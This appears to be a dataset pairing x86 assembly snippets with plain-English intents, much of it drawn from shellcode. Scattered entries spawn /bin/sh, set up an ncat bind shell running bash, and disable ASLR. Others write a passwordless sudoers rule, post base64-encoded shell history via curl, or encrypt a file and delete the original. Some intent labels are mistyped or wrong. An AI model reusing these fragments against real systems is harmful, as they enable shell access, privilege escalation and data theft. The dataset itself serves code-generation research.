SNIPPETS	INTENTS
mov ebx, esi	save esi content into ebx
mov ebx, esi	move esi into ebx
mov ebx, esp	push /bin/sh into ebx
mov ebx, esp	load the stack pointer into ebx register
mov ebx, esp	load the strinf //bin/sh in ebx register
mov ebx, esp	save addr of stack into ebx
mov ebx, esp	ebx = /bin//sh
mov ebx, esp	load the pointer to args into ebx register
mov ebx, esp	ebx points the top pf the stack
mov ebx, esp	load stack pointer into ebx register
mov ebx, esp	loast stcak pointer into ebx register
mov ebx, esp	point ebx to stack
mov ebx, esp	push esp pointer to ebx
mov ebx, esp	ebx points to the memory struct
mov ebx, esp	store esp pointer in ebx
mov ebx, esp	trasnfer esp content to ebx
mov ebx, esp	"put the address of ""/bin//sh"" into ebx via esp"
mov ebx, esp	load esp content into ebx
mov ebx, esp	ebx points to the top of the stack
mov ebx, esp	trasfer stack pointer into ebx register
mov ebx, esp	ebx points the top of the stack
mov ebx, esp	ebx point to pushed string
mov ebx, esp	move stack ptr to ebx
mov ebx, esp	"moving the pointer to ""/bin//sh"" to ebx"
mov ebx, esp	moving the pointer to the string ‘/bin//cn’ to ebx
mov ebx, esp	moves the memory address of esp(pointing to our string & nulls) from the stack into ebx
mov ebx, esp	save esp content into ebx
mov ebx, esp	save esp content into ebx register
mov ebx, esp	"save the arg ""/bin//sh/"" into ebx"
mov ebx, esp	ebx point to the structure
mov ebx, esp	save esp content into ebx regsiter
mov ebx, esp	load address of /bin/sh into ebx
mov ebx, esp	move the address of the character on the stack into ebx
mov ebx, esp	move the contents of the esp register into the ebx register
mov ebx, esp	move esp into ebx
mov ebx, esp	move address of stack pointer into ebx
mov ebx, filename	move filename into ebx
mov ebx, m_src1	move m_src1 to ebx
mov ebx, m_src2	move m_src2 to ebx
mov ebx, msg	move the address of msg string into ebx
mov ebx, n	move n to ebx
mov ebx, name	move name into ebx
mov ebx, request	move address of request variable into ebx
mov ebx, sock_reg	move sock_reg into ebx
mov ebx, type var3	move the number of bytes of var3 into ebx
mov ebx, upcase	move the value of upcase into ebx
mov ebx, x	move the contents of x into ebx
mov ebx, zero_reg	move zero_reg into ebx
mov ebx,eax	copy eax content into ebx register
mov ebx,eax	load eax content into ebx
mov ebx,eax	load eax content into ebx register
mov ebx,eax	save the returned value of the previous sys call (fd) into ebx, 2nd arg
mov ebx,eax \n push eax	move eax register to ebx register then push eax on the register
mov ebx,eax \n push ebx	trasfer aex contents into ebx contents and push ebx on the stack
mov ebx,esi	copy socket file descriptor from esi to ebx to feed clientid
mov ebx,esi	copy the esi content into ebx register
mov ebx,esi	load esi content into ebx register
mov ebx,esi	save esi content into ebx
mov ebx,esp	load esp content into ebx register
mov ebx,esp	save addr of stack into ebx
mov ebx,esp	copy esp content into ebx register
mov ebx,esp	ebx points to memory struct
mov ebx,esp	point ebx to stack
mov ebx,esp	load stack pointer into ebx register
mov ebx,esp	set first arg in ebx=*filename
mov ebx,esp	set the 1st arg /bin/bash from the stack
mov ebx,esp	save pointer into ebx
mov ecx ,esp	move esp content into ecx register
mov ecx, [ebp+12]	move the contents at the memory location specified by the result of the operation [ebp+12] into the ecx register
mov ecx, [ebp+12]	move the contents of the address [ebp+12] into ecx
mov ecx, [esi+4*eax]	move the 4 bytes of data at address esi+4*eax into ecx
mov ecx, [esp]	move the contents of esp into ecx
mov ecx, [esp]	move the contents of the esp register into the ecx register
mov ecx, [my_table]	move effective address of my_table in ecx
mov ecx, [temp3]	move the contents at memory address temp3 to ecx
mov ecx, [x]	move the contents at memory address x to ecx
mov ecx, 0777	move permissions to read write and execute into ecx
mov ecx, 0x0	move 0x0 into ecx
mov ecx, 0x04030382	mov ip address in ecx
mov ecx, 0x1	move 0x1 into ecx
mov ecx, 0x88998899	move 0x88998899 into ecx
mov ecx, 0x88998899 \n sub ecx, 0x1525152a \n push ecx	push ‘osts’ on stack
mov ecx, 1	move 1 into ecx
mov ecx, 36	get 36 in the ecx
mov ecx, 4294948047	move 4294948047 into ecx
mov ecx, 672274793	loading 0x1234567 in ecx
mov ecx, 672274793	move the value 672274793 into the ecx register
mov ecx, arguments	move the address of the arguments into ecx
mov ecx, array	move the first element of array into ecx
mov ecx, array2	move the first element in array2 into ecx
mov ecx, b	move b to ecx
mov ecx, buff	move buff to ecx
mov ecx, buffer	move the memory address of buffer variable into ecx
mov ecx, contents	move the memory address of contents string into ecx
mov ecx, contents	move the memory address of contents variable into ecx
mov ecx, donemsg	move donemsg into ecx
mov ecx, eatmsg	move eatmsg into ecx
mov ecx, eax	move eax into ecx
mov ecx, ebp	copy epb content into ecx register
mov ecx, ebp	move ebp into ecx
mov ecx, ebp	copy the value of ebp to ecx
mov ecx, ebx \n mov ebx, eax	copy ebx content into ecx and eax content into ebx
mov ecx, edi	move edi into ecx
mov ecx, edi \n xor edx, edx	load edi content into ecx register then clear edx
mov ecx, edx	put 0 in ecx
mov ecx, edx	set counter ecx = 2
mov ecx, edx	save edx content into ecx
mov ecx, edx	initialize counter, ecx, to 2
mov ecx, edx	move edx into ecx
mov ecx, edx	move the contents of the edx register into the ecx register
mov ecx, edx	backup edx into ecx
mov ecx, esi	move esi into ecx
mov ecx, esp	transfer esp contents into ecx
mov ecx, esp	trasnfer esp contents into ecx register
mov ecx, esp	trasfer esp contents to ecx register
mov ecx, esp	ecx points to the top of the stack
mov ecx, esp	load the stack pointer in ecx register
mov ecx, esp	load the stack pointer in ecx regsiter
mov ecx, esp	load esp content in ecx
mov ecx, esp	load the stack pointer into ecx register
mov ecx, esp	load esp content into ecx register
mov ecx, esp	save addr of stack into ecx
mov ecx, esp	load stack pointer into ecx register
mov ecx, esp	load esp content into ecx
mov ecx, esp	pointer to args on the stack into ecx
mov ecx, esp	load on ecx the pointer to the arguments n the stack into ecx
mov ecx, esp	load the pointer to v4lhist struct arguments in ecx register
mov ecx, esp	copy in ecx the argument pointer
mov ecx, esp	load the pointer to struct into ecx register
mov ecx, esp	load the arguments previously pushed on stack into register ecx
mov ecx, esp	load the pointer to args into ecx register
mov ecx, esp	move the pointer to args into ecx register
mov ecx, esp	move stack pointer to ecx
mov ecx, esp	copy esp content into ecx register
mov ecx, esp	copy esp content in ecx register
mov ecx, esp	save address od the top of the stack into ecx
mov ecx, esp	save the argument array into ecx register
mov ecx, esp	store argv array into ecx via the stack or esp
mov ecx, esp	save pointer to ecx
mov ecx, esp	trasnfer esp content to ecx register
mov ecx, esp	move address of the opernads into ecx
mov ecx, esp	set the args
mov ecx, esp	move stack ptr into ecx
mov ecx, esp	move stack ptr to ecx
mov ecx, esp	mv final stack ptr to ecx
mov ecx, esp	mv new stack ptr to ecx
mov ecx, esp	move satck pointer to ecx
mov ecx, esp	save esp content into ecx
mov ecx, esp	ecx point the top of the stack
mov ecx, esp	save the pointer to args in ecx register
mov ecx, esp	pointer to struct
mov ecx, esp	save the pointer to args in ecx
mov ecx, esp	move the memory location of args to ecx
mov ecx, esp	pushes the memory location of args into ecx
mov ecx, esp	move memory location of the args to ecx
mov ecx, esp	save the new socket fd into ecx
mov ecx, esp	move the memory location of the args list into ecx
mov ecx, esp	move the memeory location of the args to ecx
mov ecx, esp	moves the address of the string from the stack to ecx
mov ecx, esp	save esp content into ecx register
mov ecx, esp	load address of the parameter array into ecx
mov ecx, esp	ecx point to the structur
mov ecx, esp	load address of the parameter array
mov ecx, esp	load address of the parameter array intp ecx
mov ecx, esp	load array address into ecx
mov ecx, esp	ecx point to the structure
mov ecx, esp	move esp into ecx
mov ecx, esp	move the contents of the esp register into the ecx register
mov ecx, esp	ecx point to the top of the stack
mov ecx, esp	move the address of the stack pointer into ecx
mov ecx, esp	move the contents of esp into ecx
mov ecx, esp	move address of arguments into ecx
mov ecx, esp	save the memory location of arg[0] into the ecx register
mov ecx, esp	move address of stack pointer into ecx
mov ecx, esp	point ecx to the top of the stack
mov ecx, esp \n mov edx, esp	copy esp content into ecx and edx registers
mov ecx, filecontents	move the memory address of our file contents variable into ecx
mov ecx, hello	put the offset of hello in ecx
mov ecx, hexstr	move hexstr into ecx
mov ecx, m_src3	move m_src3 to ecx
mov ecx, msg	move msg to ecx
mov ecx, msg	move the address of message string into ecx
mov ecx, msg	move the memory address of message string into ecx
mov ecx, offset array	move starting address of array to ecx
mov ecx, readbuffer	move readbuffer into ecx
mov ecx, request	move address of request variable into ecx
mov ecx, response	move address of response variable into ecx
mov ecx, rm	move rm to ecx
mov ecx, rn	move rn to ecx
mov ecx, type var2	move the number of bytes of var2 into ecx
mov ecx, y	move the contents of y into ecx
mov ecx,eax \n push ecx	transfer eax content into ecx register then push ecx register on the stcak
mov ecx,edi	load edi content into ecx register
mov ecx,esp	transfer esp contents into ecx contents
mov ecx,esp	move espaddress to ecx
mov ecx,esp	get stack pointer to ecx
mov ecx,esp	move esp contents to ecx
mov ecx,esp	load the stack pointer into ecx register
mov ecx,esp	load the satck ppointer into ecx register
mov ecx,esp	load esp content into ecx register
mov ecx,esp	move stack pointer into ecx
mov ecx,esp	save addr of stack into ecx
mov ecx,esp	save the pointer to socket args into ecx register
mov ecx,esp	load the pointer to struct into ecx register
mov ecx,esp	tranfer the pointer to args from esp into ecx register
mov ecx,esp	save pointer (esp) to socket() args (ecx)
mov ecx,esp	load pointer to struct sockaddr into ecx register
mov ecx,esp	load into ecx the pointer to args stored in esp
mov ecx,esp	load the pointer to args into ecx regsiter
mov ecx,esp	make ecx pointing to args
mov ecx,esp	save stack pointer into ecx register
mov ecx,esp	load the pointer to the struct into ecx regsiter
mov ecx,esp	load stack pointer into ecx regisetr
mov ecx,esp	load stack pointer into ecx register
mov ecx,esp	move stack pointer to ecx
mov ecx,esp	save in ecx the pointer to socket arguements
mov ecx,esp	point ecx to stack
mov ecx,esp	copy esp content into ecx register
mov ecx,esp	save esp content into ecx register
mov ecx,esp	ecx points to the arguments adress
mov ecx,esp	save pointer into ecx
mov ecx,esp	ecx point to the top of he stack
mov ecx,esp	save esp content into ecx regoster
mov ecx,esp \n mov ecx,esp \n mov ebx,esp	transfer esp content into ecx two times and in ebx
mov edi, [ebp+16]	move value the contents of memory address ebp+16 into edi
mov edi, 0x343997b7	move 0x343997b7 into edi
mov edi, 0x3734b117	move 0x3734b117 into edi
mov edi, 0x6e69622f	push /bin in edi
mov edi, 0x978cd092	move 0x978cd092 into edi
mov edi, 0x978cd092 \n mov ebx, edi	load hexadecimal value 0x978cd092 into edi and ebx registers
mov edi, 0x978cd0d0	move 0x978cd0d0 into edi
mov edi, 0x978cd0d0 \n mov esi, 0x91969dd0 \n not edi \n not esi \n push edi \n push esi	push ‘/bin//sh on stack’
mov edi, 0xaaaa9090	move 0xaaaa9090 to edi
mov edi, 0xada67373	trtasfer the hexadecimal value 0xada67373 into edi register
mov edi, 0xada67373	move 0xada67373 into edi
mov edi, 876189623	move 876189623 into edi
mov edi, 884021143	move 884021143 into edi
mov edi, eax	copy eax content into edi register
mov edi, eax	move eax into edi
mov edi, eax	move the return value of sys_socketcall into edi
mov edi, ecx	move ecx to edi for scasd operation
mov edi, ecx	move ecx content to edi register
mov edi, ecx	copy ecx content in edi register
mov edi, ecx	move ecx to edi
mov edi, ecx	move ecx into edi
mov edi, edx	move edx into edi
mov edi, edx	move the remainder into edi
mov edi, esi	copy esi content into esi register
mov edi, esi	move encoded_shellcode pointer to edi
mov edi, esi	move esi into edi
mov edi, esi	move the pointer to the shellcode into edi
mov edi, esp	load esp content in edi register
mov edi, esp	save addr of stack into edi
mov edi, esp	edi points to the top of the stack
mov edi, esp	moving the pointer to the string ‘-le//bin//sh’ to edi
mov edi, esp	move esp into edi
mov edi, hexstr	place hexstr into edi
mov edi,0x3734b117	move hexadecimal value 0x3734b117 into edi content
mov edi,0x6e69622f	load the string /bin into edi register
mov edi,0x79844040 \n sub edi,0x11111111	load the string //sh into edi register
mov edi,ecx	load the current address from ecx to edi
mov edi,esp	load esp content into edi register
mov edi,esp	point edi to stack
mov edi,esp	save in edi the -c value
mov edx, [esi+4*ebx]	move the 4 bytes of data at address esi+4*ebx into edx
mov edx, [esp]	saves stage address to edx
mov edx, [esp]	move the contents of the esp register into the edx register
mov edx, [temp4]	move the contents at memory address temp4 to edx
mov edx, [z]	move the contents at memory address z to edx
mov edx, 0x1234567	loading the cmd argument: linux_reboot_cmd_restart in edx
mov edx, 0x1234567	move the value 0x1234567 into the edx register
mov edx, 1	move 1 into edx
mov edx, 11	move integer 11 to edx
mov edx, 12	move 12 to edx
mov edx, 13	move 13 into edx
mov edx, 2	move decimal 2 into edx
mov edx, 255	move decimal number 255 into edx
mov edx, 3	move 3 decimal into edx
mov edx, 43	move 43 decimal into edx
mov edx, 43	move decimal 43 into edx
mov edx, 66729180	move 66729180 into edx
mov edx, 78	move decimal 78 into edx
mov edx, 78	store 78 decimal into edx
mov edx, 8	move 8 decimal into edx
mov edx, 8	put 8 into edx
mov edx, 9	move number 9 into edx
mov edx, buff	move buff to edx
mov edx, bufflen	move bufflen into edx
mov edx, donelen	move donelen into edx
mov edx, dword 0x65676760	save ‘egg’ into edx register
mov edx, dword 0x65676760	move dword 0x65676760 into edx
mov edx, dword 0x65676760	move the doubleword 0x65676760 into edx
mov edx, eatlen	move eatlen into edx
mov edx, eax	copy eax content into edx
mov edx, eax	copy eax into edx
mov edx, eax	save the fd from the socket
mov edx, eax	save the socket fd contained into eax in edx
mov edx, eax	move eax into edx
mov edx, eax	backup eax into edx
mov edx, ebp	move ebp into edx
mov edx, ecx	set zero to edx
mov edx, ecx	move ecx into edx
mov edx, ecx	move ecx to edx
mov edx, egg_sig	set edx = 0x4f904790edx = 0x4f904790
mov edx, environment	move the address of environment variable into edx
mov edx, esi	move esi into edx
mov edx, esp	load the stack pointer on edx regsiter
mov edx, esp	save addr of stack into edx
mov edx, esp	get a pointer to the null value saving it in edx register
mov edx, esp	load stack pointer into edx register
mov edx, esp	save esp content into edx
mov edx, esp	moving 0 to edx
mov edx, esp	gets the memory address of the nulls onto the stack into edx
mov edx, esp	move esp into edx
mov edx, esp	move the contents of the esp register into the edx register
mov edx, esp	move address of stack pointer into edx
mov edx, esp	point edx to the stack pointer
mov edx, esp	move the stack pointer into edx
mov edx, filename	move filename into edx
mov edx, hellolen	move hellolen into edx
mov edx, hexlen	move hexlen into edx
mov edx, len	move variable len to edx
mov edx, m_src4	move m_src4 to edx
mov edx, n	move n to edx
mov edx, readbuffer	move readbuffer into edx
mov edx, readlen	move readlen into edx
mov edx, response	move address of response variable into edx
mov edx, src	move the contents of src variable into edx
mov edx, tmp	move the contents of tmp variable into edx
mov edx, type var1	move the number of bytes of var1 into edx
mov edx,0x4f904790	copy the hexadecimal value of “.g.o” into ed register
mov edx,eax	copy eax content into edx register
mov edx,esp	load the stack pointer into edx register
mov edx,esp	load esp cpntent into edx register
mov edx,esp	move stack pointer into edx
mov edx,esp	load esp content into edx register
mov esi , esp	load the stack pointer into esi register
mov esi, [ebp+12]	move the contents of memory address ebp+12 into esi
mov esi, 0x222933f0	move 0x222933f0 into esi
mov esi, 0x243525f0	move 0x243525f0 into esi
mov esi, 0x34399797	move 0x34399797 into esi
mov esi, 0x353ffc3b	transfer hexadecimal value 0x353ffc3b into esi regsiter
mov esi, 0x353ffc3b	move 0x353ffc3b into esi
mov esi, 0x563a1f3e	move 0x563a1f3e into esi
mov esi, 0x65636170	move 0x65636170 into esi
mov esi, 0x65636170 \n push esi \n xor esi, esi \n mov esi, 0x735f6176 \n push esi \n xor esi, esi \n push dword 0x5f657a69 \n push dword 0x6d6f646e \n push dword 0x61722f6c \n push dword 0x656e7265 \n push dword 0x6b2f7379 \n push dword 0x732f636f \n mov esi, 0x72702f2f \n push esi \n xor esi, esi \n mov ebx,esp	push the string //proc/sys/kernel/randomize_va_space on the stack and then load the stack pointer on ebx register
mov esi, 0x68732f2f	push //sh in esi
mov esi, 0x68732f2f	move 0x68732f2f into esi
mov esi, 0x72702f2f	move 0x72702f2f into esi
mov esi, 0x735f6176	move 0x735f6176 into esi
mov esi, 0x91969dd0	move 0x91969dd0 into esi
mov esi, 0xd2c45e5e	move 0xd2c45e5e into esi
mov esi, 10	move 10 into esi
mov esi, 9	move 9 into esi
mov esi, buff	place address buff into esi
mov esi, eax	save returned file descriptor from eax into esi
mov esi, eax	save eax contents in esi contents
mov esi, eax	save socket file descriptor from eax into esi
mov esi, eax	transfer eax content into esi register
mov esi, eax	transfer fd for next call from eax into esi register
mov esi, eax	copy eax content in esi register
mov esi, eax	copy eax to esi content
mov esi, eax	store sockfd in esi register
mov esi, eax	store socket descriptor into esi register
mov esi, eax	save eax content into esi
mov esi, eax	save the newly created socket from eax to esi
mov esi, eax	move pointer in eax into esi
mov esi, eax	move eax into esi
mov esi, eax \n xor eax, eax	copy socket des from eax to esi register then clear eax
mov esi, ecx	copy ecx into esi register
mov esi, ecx	move ecx into esi
mov esi, edx	move remainder into esi
mov esi, esp	load in esi the pointer to ‘-f’ argument
mov esi, esp	load esp contents on esi register
mov esi, esp	load the the stack pointer in esi register
mov esi, esp	load esp content in esi regsister
mov esi, esp	save addr of stack into esi
mov esi, esp	save the name of the file into esi register
mov esi, esp	moving the pointer to ‘-vp13337’to esi
mov esi, esp	save esp content into esi register
mov esi, esp	move esp into esi
mov esi, v	move v to esi
mov esi, v_src	move v_src to esi
mov esi, var	copy the address of var into esi
mov esi,0x34399797	move hexadecimal value 0x34399797 into esi content
mov esi,eax	move the socket file descriptor from eax to esi
mov esi,eax	saves socket descriptor from eax into esi regsiter
mov esi,eax	save the socket descriptor stored in eax in esi
mov esp, ebp	move the contents of the ebp register ino the esp register
mov esp, ebp	move the contents of the ebp register into the esp register
mov esp,0x1cd9faf7	copy 0x1cd9faf7 into esp content
mov long [esi+18], esi	move the contents of the esi register into the long starting at the address [esi+18]
mov long [esi+22], ebx	move the contents of the ebx register into the long starting at the address [esi+22]
mov long [esi+22], esi	move the contents of the esi register into the long starting at the address [esi+22]
mov long [esi+26], eax	move the contents of the eax register into the long starting at the address [esi+26]
mov long [esi+26], ebx	move the contents of the ebx register into the long starting at the address [esi+26]
mov long [esi+30], eax	move the contents of the eax register into the long starting at the address [esi+30]
mov rcx, 0x68732f2f6e69622f	move the immediate value /bin//sh in hex in rcx
mov sock_reg, eax	move eax into sock_reg
mov total, 48	transfer the value 48 in the memory variable total
mov word [ebx], 2	move the 16-bit integer representation of 2 into the 2 bytes starting at the address in ebx
mov word [ecx], 2	move the 16-bit integer representation of 2 into the 2 bytes starting at address ecx
mov word [edi], ax	move ax into the word in edi
mov word [esp+0x1], 0x776f	move 0x776f into the word in [esp+0x1]
mov word ptr [edi-0x69622f69],ss	copy ss content into the word at the adress edi-0x69622f69
mov x, eax	move eax to x variable
mov[esi+13], al	null terminate /usr/bin/ncat
mov[esi+22], al	null terminate -lvp1337
mov[esi+34], al	null terminate -e/bin/bash
mov[esi+35], esi	store address of /usr/bin/ncat in aaaa
mov[esi+39], ebx	store address of -lvp1337 in bbbb taken from ebx
mov[esi+43], ebx	store address of -e/bin/bash in cccc taken from ebx
mov[esi+47], eax	zero out dddd
move ecx, edx	backup edx into ecx
movq mm0, qword [edi]	move the 64 bit of edi into mm0 64bit register
movq mm0, qword [edi]	"move 8bytes of ""xor_value"" to mm0"
movq mm1, qword [esi]	move the 64 bit of esi into mm1 64bit register
movq mm1, qword [esi]	"move 8bytes of ""shellcode"" to mm1"
movq mm2, qword [edi]	"move 8bytes of ""rot_value"" to mm2"
movq mm3, qword [esi]	"move 8bytes of ""shellcode"" to mm3"
movq qword [esi], mm0	transfer the 64 bit of mm0 register to the 64bit register esi
movq qword [esi], mm0	"overwrite the ""shellcode"" with previous results"
movq qword [esi], mm3	"overwrite the ""shellcode"" with previous results"
mp short call_decoder	perform a short unconditional jump to call_decoder
msg db 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post', 0x0a	define msg as the byte string 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post'
msg db 'hello, world!', 0xa	declare msg string containing 'hello world!'
msg db 'i love you!', 0ah	define msg variable and initialize with 'i love you!'
msg db 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt', 0x0a	define msg as the byte string 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt'
msg db 'we found the egg!', 0ah, 0dh	define msg as the byte string 'we found the egg!'
msg_len equ $-msg	define msg_len equal to the length of msg
msg1 db 'hello, brave new world!', 0ah	declare message string msg1 containing 'hello brave new world!'
msg2 db 'passwd', 0x00	define msg2 as the byte string 'passwd'
msg2 db 'this is how we recycle in nasm.', 0ah	declare message string msg2 containing 'this is how we recycle in nasm'
msglength: equ 12	declare msglength to have the constant value 12
mul [tmp]	multiply the contents of eax by the 32-bit contents of the memory location tmp
mul [value]	multiply the contents of eax by the 32-bit contents of the memory location value
mul [var]	multiply the contents of eax by the 32-bit contents of the memory location var
mul 0x10	multiply eax by 0x10 and stores the result in edx:eax
mul 25	multiply the contents of eax by 25
mul 3	multiply the contents of eax by 3
mul ebx	xoring eax and edx
mul ebx	zero out eax register
mul ebx	clear eax
mul ebx	multiply the contents of eax by ebx
mul ebx	multiply the contents of the eax register by the contents of the ebx register
mul ebx	multiply eax by ebx
mul ebx	multiply eax by the contents of the ebx register
mul ebx	mul eax by ebx
mul ecx	multiply by ecx, zero out eax and edx
mul ecx	mutliply eax by 0
mul ecx	clear eax
mul ecx	mul eax by ecx
mul ecx	multiply eax by the contents of the ecx register
mul ecx	mutliply eax by ecx
mul ecx	multiply eax by ecx
mul edx	multiply edx with eax saving the result in eax
mul edx	multiply eax by the contents of the edx register
mul edx	mul eax by edx
mul edx	multiply eax by edx
my_table times 10 dw 0	allocate 10 words each initialized to 0
my_table times 10 dw 0	allocate my_table vector of 10 words each initialized to 0
my_var dw 0abcdh	define my_var word variable and initialize it to 0abcdh
myList word 1,2,3,4,5	define myList array of word and initialize it to 1, 2, 3, 4, and 5
name db '/bin/sh', 0	define name as the byte string '/bin/sh'
name db 30 dup	allocate memory for 30 bytes uninitialized name variable
neg eax	negate eax
neg eax	negate the contents of eax
neg eax	replaces the contents of the eax register with its two's complement
neg ebx	replaces the contents of the ebx register with its two's complement
neg ecx	replaces the contents of the ecx register with its two's complement
neg edi	performs the two's complement negation of the edi contents.
neg edi	negate edi
neg edi	replaces the contents of the edi register with its two's complement
neg edx	replaces the contents of the edx register with its two's complement
neg var	negate the contents of var
neg_number dw -12345	define the variable neg_number of words and initialize it to -12345
negative:	define negative label
negative: \n not dl \n inc dl	in the negative function negate dl and increment dl to the next byte
next_addr:	define next_aaddr label
next_addr:	define _next_addr label
next_addr:	define next_addr label
next_addr:	declare next_addr function
next_addr:	declare the next_addr label
next_cycle:	declare the next_cycle label
next_cycle:	define next_cycle label
next_cycle: \n inc edi \n jmp short formatting	in next_cycle increment edi by one and jump short to formatting
next_page:	define next_page label
next_page:	declare next_page function
next:	define _next label
next:	declare the next label
nop	no operation
nop	run no operation
nop	execute no operation
nop	do no operation
nop	do nothing
not ax	negate all the bits of ax register
not ax	negate all the bits of the ax register
not byte [edi]	one's complement negation of the byte edi in memory
not byte [esi]	one's complement negation of the byte esi in memory
not byte [esi]	perform a bit-wise inversion of the byte starting at the address in esi
not byte [esi]	not operation of current byte in esi
not byte [tmp]	negate all bits in the byte at the memory location tmp
not byte [var]	negate all bits in the byte at the memory location var
not byte [var2]	negate all bits in the byte at the memory location var2
not byte ptr [esi]	negate all bits in the byte contained into esi regsiter
not dl	negate all the bits of dl register
not dword ptr [esi+0x73]	negate all bits of th souble word stored at the adress esi+0x73
not eax	negate all the bits of the eax register
not ecx	negate all the bits of ecx register
not ecx	negate all the bits of the ecx register
not edi	negate all bits of edi register
not edi	negate all the bits of the edi register
not edx	perform a bit-wise inversion of edx
not esi	negate all the bits of the esi register
not word ax	negate all bits in the word contained into ax regsiter
not word ax	negate all the bits of the word at the address ax
not_equal:	not_equal label
notdecode:	declare _notdecode label
notdecode:	notdecode function
number dw 12345	define number variable of a word and initialize to 12345
number: resb 1	reserve 1 byte for number variable
numbers dw 34, 45, 56, 67, 75, 89	declare an array of six words each initialized with the numbers 34 45 56 67 75 89
odd_number:	declare odd_numer function
odd_number:	define odd_number
one:	define one_label
one:	define _one label
one:	declare the one label
one:	declare one label
open:	define open_label
or al, bl	perform or operation between al and bl registers
or al, syscall_execve	load execve in eax
or al, syscall_execve	perform or operation between the al register and syscall_execve
or al,0x78	oring hexadecimal value 0x78 to al register
or cx, 0xfff	align page address
or cx, 0xfff	perform logical or between the cx register and 0xfff
or dx, 0xfff	oring hexadecimal value 0xfff with dx register
or dx, 0xfff	perform or operation between dx and 0xfff and save the result into dx
or eax, 0xffffffff	perform the or operation between the eax register and 0xffffffff
or eax, 0xffffffff \n not eax \n push eax	move the value -1 in eax register then do the one's complement negation of eax end then push it on the stack
or ebp,dword ptr [edx-0x557f5533]	oring the double word at the adress edx-0x557f5533 wth ebp content
output:	define _output string
output:	declare the output label
path db '//bin/sh'	define path as the byte string '//bin/sh'
path db '//bin/sh'	define the byte string path and initialize it to '//bin/sh'
path:	declare the path label
pop [eax]	pop the top element of the stack into memory at the four bytes starting at location eax
pop [ebx]	pop the top element of the stack into memory at the four bytes starting at location ebx
pop ax	pop the last element pushed onto the stack into ax
pop bx	pop the last element pushed onto the stack into bx
pop cx	pop the last element pushed onto the stack into cx
pop cx	pop the value on the stack back into cx
pop cx	restore the top of the stack into the cx register
pop dx	pop the value on the stack back into dx
pop dx	restore the top of the stack into the dx register
pop eax	put syscall value into eax
pop eax	pick up eax from the stack
pop eax	pop eax from stack
pop eax	pick up eax content from the stack
pop eax	pick up eax content from stack
pop eax	pop 102 into eax
pop eax	pop the value on the stack back into eax
pop eax	restore eax from the value we pushed onto the stack at the start
pop eax	restore the original value of eax
pop eax	restore the top of the stack into eax register
pop eax	restore the top of the stack into the eax register
pop eax	pop the top of the stack into the eax register
pop eax	remove last character from the stack into edx
pop eax	pop the next argument off the stack into eax
pop eax	remove last character from the stack into eax
pop ebp	restore ebp register
pop ebp	restore the top of the stack into the ebp register
pop ebx	pick up ebx contents from the top of the stack
pop ebx	pick up ebx register from the stack
pop ebx	pick up ebx content from the register
pop ebx	pick up ebx content from the stack
pop ebx	pick up ebx content from stack
pop ebx	pick up ebx from stack
pop ebx	pop stack(2 = sys_bind = bind()) into ebx
pop ebx	load string into rbx register
pop ebx	set sys_bind = 2
pop ebx	save the string ‘ /bin/sh’ into ebx
pop ebx	save the byte string ‘mt.txtx’ into ebx register
pop ebx	save th byte string '/proc/sys/kernel/randomize_va_spacex' into ebx register
pop ebx	restore ebx from the value we pushed onto the stack at the start
pop ebx	restore the original value of ebx
pop ebx	restore the top of the stack into ebx register
pop ebx	restore the top of the stack into the ebx register
pop ebx	remove last character from the stack into ebx
pop ebx	pop the value on the stack back into ebx
pop ecx	extract ecx from the stack
pop ecx	pick up ecx contents from the stack
pop ecx	pick up ecx register from the stack
pop ecx	pick up _ecx label from the satck
pop ecx	pick up ecx content from stack
pop ecx	pick up ecx from stack
pop ecx	piack up ecx content from stack
pop ecx	"pick uo ""all all=(all) nopasswd: all"" stored i ecx from stack"
pop ecx	pick up ecx content from the stack
pop ecx	pop 3 into ecx for counter
pop ecx	get the command string to write in the file, 3rd arg
pop ecx	save addr ptr into ecx
pop ecx	remove last character from the stack into ecx
pop ecx	restore ecx from the value we pushed onto the stack at the start
pop ecx	restore ecx register
pop ecx	pop the value on the stack back into ecx
pop ecx	restore the top of the stack into the ecx register
